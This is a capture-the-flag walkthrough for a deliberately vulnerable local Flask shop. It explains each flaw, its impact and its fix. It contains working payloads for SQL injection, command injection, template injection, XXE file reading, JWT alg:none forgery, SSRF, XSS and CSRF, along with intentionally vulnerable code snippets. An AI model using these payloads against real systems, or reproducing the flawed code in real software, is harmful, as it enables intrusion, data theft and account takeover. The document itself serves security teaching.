# ScalerKart CTF Walkthrough

This guide explains how each ScalerKart challenge was solved on the local Docker instance. ScalerKart does not give you a flag string to submit. When the vulnerable behavior is triggered, the app reports the solve automatically to the flag server.

Only run these against your own local ScalerKart instance.

## Accounts Used

The running container accepted these credentials:

```text
customer1 / Customer123!
seller1   / Seller123!
```

The class handout mentioned `Customer1234!`, but this local image used `Customer123!`.

## Quick Mental Model

ScalerKart is a Flask e-commerce app. Most challenges are solved by making a request that reaches a vulnerable route. Some routes are customer-only, some are seller-only, and XSS/CSRF challenges use internal proof endpoints to simulate a victim browser.

The easiest way to understand the app is:

```text
Customer routes:
/products/search
/cart/update
/cart/checkout
/api/orders/<id>
/orders/<id>/label
/orders/<id>/label/status
/account/banner-preview
/products/<id>/reviews
/wishlist
/account/addresses

Seller routes:
/seller/products/<id>/image
/seller/products/<id>/import-image
/seller/dashboard/reviews
```

## 1. IDOR / BOLA - View Another User's Order

**Challenge name:** `bola_orders`

### What Is Wrong

The API route `/api/orders/<order_id>` fetches any order by ID. It checks whether the order belongs to the logged-in user, but instead of blocking access, it still returns the order and reports the challenge solve.

The broken logic is effectively:

```python
order = SELECT * FROM orders WHERE id = ?
if order["user_id"] != session["user_id"]:
    report_solve("bola_orders")
return order
```

### How To Exploit

Log in as `customer1`, then request another user's order:

```http
GET /api/orders/2
```

Expected result:

```json
{
  "order_id": 2,
  "card_last4": "1881",
  "shipping_address": "221B Baker Street, Bengaluru"
}
```

### Why It Works

The endpoint trusts the URL order ID and does not enforce ownership before returning the data.

### Impact

A user can read other customers' orders, card last four digits, shipping addresses, and order contents.

### Fix

Require ownership in the SQL query:

```sql
SELECT * FROM orders WHERE id = ? AND user_id = ?
```

Return `403` or `404` when the order does not belong to the current user.

## 2. Business Logic - Negative Cart

**Challenge name:** `bizlogic_negative_cart`

### What Is Wrong

The cart API accepts negative quantities. Checkout multiplies product price by quantity without checking that quantity is positive.

### How To Exploit

Log in as `customer1`, then send:

```http
POST /cart/update
Content-Type: application/json

{"product_id":1,"quantity":1}
```

Then add a negative quantity for a more expensive item:

```http
POST /cart/update
Content-Type: application/json

{"product_id":2,"quantity":-100}
```

Checkout:

```http
POST /cart/checkout
```

Observed result:

```json
{"order_id":4,"total":-449101.0}
```

### Why It Works

The server treats quantity as trusted input. A negative quantity makes the total negative:

```text
799 * 1 + 4499 * -100 = negative total
```

### Impact

In a real shop, this could create free orders, fake credits, refund abuse, or accounting corruption.

### Fix

Validate on the server:

```python
if not isinstance(quantity, int) or quantity < 1 or quantity > 20:
    return error
```

Also recompute totals from trusted product prices during checkout.

## 3. SQL Injection - UNION Search

**Challenge name:** `sqli_union_search`

### What Is Wrong

The search endpoint builds SQL using string interpolation:

```python
q = request.args.get("q", "")
results = db_fetchall(
    f"SELECT id, name, price, description FROM products WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'"
)
```

Because `q` is inserted directly, SQL syntax in the search term is executed.

### How To Exploit

Log in as `customer1`, then visit:

```http
GET /products/search?q=' UNION SELECT id, recovery_code, 0, username FROM sellers--
```

### Why The Payload Works

The original query returns four columns:

```text
id, name, price, description
```

So the injected `UNION SELECT` also returns four columns:

```text
id, recovery_code, 0, username
```

The seller recovery code appears in the product search results. That triggers the solve.

### Impact

An attacker can read sensitive database rows and may be able to dump users, password hashes, recovery codes, or order data.

### Fix

Use parameterized queries:

```python
db_fetchall(
    "SELECT id, name, price, description FROM products WHERE name LIKE ? OR description LIKE ?",
    (f"%{q}%", f"%{q}%")
)
```

Never build SQL by concatenating user input.

## 4. JWT Algorithm None Bypass

**Challenge name:** `jwt_alg_none_reset`

### What Is Wrong

The password reset endpoint accepts JWTs with header `{"alg":"none"}`. That means the server trusts an unsigned token.

### How To Exploit

Ask for a reset link for the victim account:

```http
POST /account/forgot-password
Content-Type: application/json

{"email":"customer2@scalerkart.test"}
```

The response contains:

```json
{"reset_link":"/account/reset-password?token=<jwt>"}
```

Decode the JWT payload, keep the same payload, but replace the header with:

```json
{"alg":"none","typ":"JWT"}
```

Then create an unsigned JWT:

```text
base64url(header).base64url(payload).
```

Use it:

```http
POST /account/reset-password
Content-Type: application/json

{"token":"<forged unsigned token>","new_password":"Hacked123!"}
```

### Why It Works

The server explicitly checks the JWT header and accepts `alg:none` without verifying a signature.

### Impact

An attacker can reset another user's password if they can obtain or recreate a valid reset payload.

### Fix

Never accept `alg:none`. Pin the expected algorithm server-side:

```python
jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```

Ignore the token's requested algorithm and use a strong secret.

## 5. SSRF - Seller Image Import

**Challenge name:** `ssrf_image_import`

### What Is Wrong

The seller image import endpoint accepts a URL and makes a server-side request to it:

```python
resp = requests.get(image_url, timeout=5)
```

It does not block localhost or internal services.

### How To Exploit

Log in as `seller1`, then send:

```http
POST /seller/products/1/import-image
Content-Type: application/json

{"image_url":"http://127.0.0.1:5000/internal/seller-api-key"}
```

### Why It Works

From your browser, `/internal/seller-api-key` blocks non-local requests. But the server makes the request from itself, so the remote address becomes `127.0.0.1`.

### Impact

An attacker can make the server access internal-only services, metadata endpoints, admin panels, or local files exposed over HTTP.

### Fix

Block private/internal IP ranges, localhost, link-local addresses, and redirects to blocked hosts. Use an allowlist of trusted image domains where possible.

## 6. Command Injection - Label Export

**Challenge name:** `cmdi_label_export`

### What Is Wrong

The label endpoint runs a shell command with user input:

```python
subprocess.run(
    f"label-printer '{recipient_name}' --order {order_id}",
    shell=True,
    capture_output=True,
    text=True,
)
```

Because `shell=True` is used, a crafted `recipient_name` can break out of the quoted string.

### How To Exploit

Create an order as `customer1`, then send:

```http
POST /orders/<order_id>/label
Content-Type: application/json

{"recipient_name":"test'; id; echo '"}
```

Check the label log:

```http
GET /orders/<order_id>/label/status
```

Observed output:

```text
Label printed for test
uid=0(root) gid=0(root) groups=0(root)
 --order 5
```

### Why The Payload Works

The command becomes roughly:

```sh
label-printer 'test'; id; echo '' --order 5
```

The semicolon starts a new command, so `id` executes.

### Impact

Remote command execution inside the web container. This is one of the most serious bugs.

### Fix

Do not use `shell=True`. Pass arguments as a list:

```python
subprocess.run(
    ["label-printer", recipient_name, "--order", str(order_id)],
    shell=False,
)
```

Also validate recipient names and run the process with least privilege.

## 7. SSTI - Banner Preview Filter Bypass

**Challenge name:** `ssti_banner_filter_bypass`

### What Is Wrong

The banner preview endpoint renders user input with Jinja:

```python
render_template_string(f"<p>{message}</p>")
```

It tries to block dangerous strings like `__globals__`, `os`, and `import`, but this is a blacklist and can be bypassed.

### How To Exploit

Log in as `customer1`, then visit:

```http
GET /account/banner-preview?message={{lipsum[('__gl'~'obals__')]['__builtins__']['open']('/app/data/canary_ssti.txt').read()}}
```

### Why The Payload Works

The filter blocks the literal string `__globals__`. The payload builds the same string at runtime:

```jinja2
'__gl' ~ 'obals__'
```

Jinja evaluates it after the blacklist check. Then it reaches Python builtins and reads the canary file.

### Impact

Server-side template injection can lead to file read, secret leakage, and often full code execution depending on the environment.

### Fix

Never render untrusted input as a template. Escape it as plain text:

```python
return render_template("preview.html", message=message)
```

In the template:

```jinja2
{{ message }}
```

Do not rely on blacklists for template security.

## 8. Reflected XSS - Brand Parameter

**Challenge name:** `xss_reflected_brand`

### What Is Wrong

A reflected XSS happens when user input from the URL is inserted into HTML/JavaScript without safe escaping. In this challenge, the victim proof endpoint records the solve when the simulated victim account is reached.

### How To Exploit

The proof route is:

```http
GET /proof/reflect_brand
```

In the real flow, the attacker would craft a malicious URL containing a script payload in a reflected parameter, then get `customer2` to open it. The payload would call:

```javascript
fetch("/proof/reflect_brand")
```

### Why It Works

The browser executes attacker-controlled JavaScript in the context of ScalerKart. Because it runs as the victim, it can call same-origin endpoints with the victim's session.

### Impact

Session actions as the victim, data theft from the page, account changes, or chaining to CSRF-like actions.

### Fix

Contextually escape all reflected values. Use safe template rendering, avoid `innerHTML`, and add a Content Security Policy.

## 9. Stored XSS - Product Review

**Challenge name:** `xss_stored_review`

### What Is Wrong

Reviews are stored and later rendered to sellers. The app only removes exact `<script>` tags:

```python
text.replace("<script>", "").replace("</script>", "")
```

That does not block event-handler payloads.

### How To Exploit

Log in as `customer1`, then post a review:

```http
POST /products/1/reviews
Content-Type: application/json

{"text":"<img src=x onerror='fetch(\"/proof/stored_review\")'>"}
```

When the seller victim views reviews, the image fails to load and `onerror` runs.

### Why It Works

The payload does not use a `<script>` tag, so the naive sanitizer does not remove it.

### Impact

Stored XSS is persistent. Any seller who views the review can be attacked.

### Fix

Use a real HTML sanitizer such as Bleach with a strict allowlist, or render reviews as escaped text only. Never use simple string replacement as an XSS defense.

## 10. DOM XSS - Wishlist PostMessage

**Challenge name:** `xss_dom_postmessage`

### What Is Wrong

DOM XSS occurs when client-side JavaScript trusts browser-controlled data such as `location`, `hash`, or `postMessage`. This challenge uses an unsafe postMessage flow on the wishlist page.

### How To Exploit

The proof endpoint is:

```http
GET /proof/dom_wishlist_msg
```

In the real attack, an attacker-controlled page would iframe or open the wishlist page and send a malicious `postMessage`. The vulnerable page handles the message without checking origin or validating content, then the payload causes navigation or script execution that reaches the proof endpoint.

### Why It Works

The page trusts messages from any origin. Browser messages are attacker-controlled unless the code checks `event.origin` and validates `event.data`.

### Impact

Victim-side script execution or unwanted same-origin actions.

### Fix

Check the origin:

```javascript
if (event.origin !== "http://localhost:3000") return;
```

Validate message shape and never put message data into `innerHTML`.

## 11. CSRF - GET Address Remove

**Challenge name:** `csrf_get_address_remove`

### What Is Wrong

Address deletion is performed with a GET request:

```http
GET /account/address/remove/<address_id>
```

GET requests can be triggered by links, images, iframes, or redirects from another site. There is no CSRF token.

### How To Exploit

As the victim customer, first create an address:

```http
POST /account/address/add
line1=221B Baker Street&city=Bengaluru&postal_code=560001
```

Then visit:

```http
GET /account/address/remove/<address_id>
```

An attacker could embed this as:

```html
<img src="http://localhost:3000/account/address/remove/1">
```

### Why It Works

Browsers automatically include cookies on same-site requests. If the victim is logged in, the delete action happens with their session.

### Impact

Attackers can delete user addresses or perform other state-changing actions if exposed through GET or unprotected POST routes.

### Fix

Use POST/DELETE for state changes and require CSRF tokens. Also set appropriate SameSite cookie policy.

## 12. XXE - SVG Image Upload

**Challenge name:** `xxe_svg_image`

### What Is Wrong

The seller SVG upload parser enables DTD loading and entity resolution:

```python
lxml.etree.XMLParser(load_dtd=True, resolve_entities=True, no_network=False)
```

That allows XML external entities to read local files.

### How To Exploit

Log in as `seller1`, then upload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///app/data/canary_xxe.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <title>&xxe;</title>
</svg>
```

Send it to:

```http
POST /seller/products/1/image
Content-Type: multipart/form-data
file=@exploit.svg
```

Observed response:

```json
{"caption":"8c35f8f2606b6b2605aa310027f27b7b"}
```

### Why It Works

The XML parser expands `&xxe;` by reading `file:///app/data/canary_xxe.txt`. The expanded content becomes the SVG `<title>`, which the app stores as the image caption.

### Impact

Local file read from the server. This can expose secrets, credentials, tokens, environment files, or source code.

### Fix

Disable dangerous XML features:

```python
parser = lxml.etree.XMLParser(
    load_dtd=False,
    resolve_entities=False,
    no_network=True,
)
```

Prefer safe SVG sanitization or rasterize untrusted SVGs in a locked-down sandbox.

## How To Re-run The Solves Manually

You can use browser dev tools, Burp, Postman, or Python `requests`. The important part is to preserve login cookies for the correct role.

A simple pattern:

```python
import requests

s = requests.Session()
s.post("http://localhost:3000/login", data={
    "username": "customer1",
    "password": "Customer123!"
})

r = s.get("http://localhost:3000/api/orders/2")
print(r.status_code, r.text)
```

For seller-only routes:

```python
s = requests.Session()
s.post("http://localhost:3000/login", data={
    "username": "seller1",
    "password": "Seller123!"
})
```

## Best Learning Order

If you are studying these, learn them in this order:

1. IDOR/BOLA - easiest auth logic bug.
2. Business Logic - teaches server-side validation.
3. SQL Injection - teaches query structure.
4. CSRF - teaches browser cookie behavior.
5. Stored/Reflected/DOM XSS - teaches browser trust boundaries.
6. SSRF - teaches server-side network trust.
7. XXE - teaches unsafe parser features.
8. SSTI - teaches template execution context.
9. Command Injection - teaches shell metacharacters.
10. JWT alg none - teaches why crypto decisions must be server-side.

## Evidence Files

Four screenshot proofs were generated:

```text
evidence/01-sqli-union-search.html.png
evidence/02-business-logic-negative-cart.html.png
evidence/03-command-injection-label.html.png
evidence/04-xxe-svg-upload.html.png
```

Four submission-ready writeups are here:

```text
writeups/scalerkart-writeups.md
```
